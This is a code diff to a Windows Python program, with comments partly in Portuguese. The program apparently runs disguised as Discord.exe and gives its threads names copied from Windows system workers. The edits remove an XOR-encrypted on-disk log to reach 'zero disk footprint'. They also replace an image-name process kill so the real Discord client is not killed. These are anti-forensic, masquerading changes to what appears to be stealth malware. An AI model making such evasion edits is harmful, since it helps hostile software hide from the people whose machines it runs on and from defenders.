@@ -35,15 +35,8 @@ else:
 _log_path  = os.path.join(_base_dir, _s(_ENC_LOG))
 
 def _log(msg: str) -> None:
-    try:
-        # XOR-encrypt each byte before write — opaque on disk.
-        # decoder: `python -c "print(open(p,'rb').read().translate(bytes(b^0x6D for b in range(256))).decode('utf-8',errors='replace'))"`
-        data = (msg + "\n").encode("utf-8")
-        enc  = bytes(b ^ 0x6D for b in data)
-        with open(_log_path, "ab") as f:
-            f.write(enc)
-    except Exception:
-        pass
+    # No-op: zero disk footprint. Reativar escrita XOR aqui se precisar de debug em dev.
+    pass
 
 _THREAD_POOL = (
     "TppWorker", "RpcWorker", "LdrpWorker", "NtWaitThread",
@@ -239,15 +232,8 @@ kernel32.QueryFullProcessImageNameW.argtypes = [
 
 
 def _kill_existing_instances() -> None:
-    me        = os.getpid()
-    parent_me = os.getppid()
-    exe_name  = os.path.basename(sys.executable).lower()
-
-    if "python" not in exe_name:
-        cmd = f'taskkill /F /IM "{exe_name}" /FI "PID ne {me}" /FI "PID ne {parent_me}" > NUL 2>&1'
-        os.system(cmd)
-        time.sleep(0.5)
-
+    # PID-targeted kill via lock file only — never kill by image name,
+    # senão mataríamos o cliente Discord legítimo quando o exe se chama Discord.exe.
     _kill_by_lock_file()
 
     try:
@@ -1377,8 +1363,6 @@ def main() -> None:
 
 
 if __name__ == "__main__":
-    with open(_log_path, "wb") as _f:
-        _f.write(bytes(b ^ 0x6D for b in b"start\n"))
     try:
         main()
         _log("exit")
